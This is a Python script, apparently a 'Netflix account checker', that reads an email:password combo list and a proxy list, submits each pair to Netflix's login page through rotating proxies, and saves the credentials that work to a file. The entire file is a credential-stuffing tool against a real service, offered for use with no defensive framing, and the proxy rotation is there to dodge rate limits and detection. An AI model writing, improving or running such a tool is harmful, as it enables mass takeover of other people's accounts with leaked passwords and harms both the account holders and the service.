import sys
import logging
from PyQt5.QtWidgets import QApplication, QWidget, QVBoxLayout, QPushButton, QLabel, QFileDialog
import requests

# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def load_credentials_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            credentials = [line.strip().split(':') for line in file.readlines()]
            return credentials
    except FileNotFoundError:
        logger.error("File not found.")
        raise

def load_proxies_from_file(file_path):
    proxies = []
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for line in file:
                proxy_parts = line.strip().split(':')
                if len(proxy_parts) == 2:
                    proxy_host, proxy_port = proxy_parts
                    try:
                        proxy_port = int(proxy_port)
                        proxies.append((proxy_host, proxy_port))
                    except ValueError:
                        logger.warning(f"Invalid port number for proxy: {proxy_port}. Skipping.")
                else:
                    logger.warning(f"Invalid proxy entry: {line.strip()}. Skipping.")
    except FileNotFoundError:
        logger.error("File not found.")
        raise
    return proxies


def choose_file(prompt):
    app = QApplication(sys.argv)
    file_path, _ = QFileDialog.getOpenFileName(None, prompt, "", "Text files (*.txt)")
    return file_path

def main():
    logger.info("Welcome to Account Checker!")

    # Choose email:password file
    email_password_file = choose_file("Select email:password file")
    if not email_password_file:
        logger.error("No email:password file selected.")
        sys.exit()

    # Choose proxy file
    proxy_file = choose_file("Select proxy file")
    if not proxy_file:
        logger.error("No proxy file selected.")
        sys.exit()

    # Load credentials and proxies
    accounts = load_credentials_from_file(email_password_file)
    proxies = load_proxies_from_file(proxy_file)

    if not accounts:
        logger.error("No accounts found.")
        sys.exit()

    if not proxies:
        logger.error("No proxies found.")
        sys.exit()

    total_accounts = len(accounts)
    successful_logins = 0
    successful_accounts = []
    failed_accounts = []

    logger.info(f"Total accounts: {total_accounts}")

    # Iterate through accounts
    for account_index, account in enumerate(accounts, start=1):
        email, password = account
        proxy_host, proxy_port = proxies[account_index % len(proxies)]  # Cycle through proxies

        # Login endpoint for Netflix
        login_url = "https://www.netflix.com/login"

        # Request headers
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
        }

        # Login data (email and password)
        login_data = {
            "userLoginId": email,
            "password": password,
        }

        logger.info(f"Attempting login for account {account_index}/{total_accounts}...")

        try:
            # Send POST request to login endpoint using proxy
            response = requests.post(login_url, data=login_data, headers=headers, proxies={"http": f"http://{proxy_host}:{proxy_port}", "https": f"http://{proxy_host}:{proxy_port}"})

            # Check if login was successful
            if response.status_code == 200 and "class=\"our-story-card-container" in response.text:
                logger.info("Login successful")
                successful_logins += 1
                successful_accounts.append(account)
            else:
                logger.info("Login failed: Invalid credentials")
                failed_accounts.append(account)
        except requests.exceptions.RequestException as e:
            logger.error(f"Login failed: {e}")
            failed_accounts.append(account)

    logger.info(f"Total successful logins: {successful_logins}/{total_accounts}")

    # Save successful accounts to a file
    if successful_accounts:
        with open("successful_accounts.txt", "w") as file:
            for email, password in successful_accounts:
                file.write(f"{email}:{password}\n")

if __name__ == "__main__":
    main()
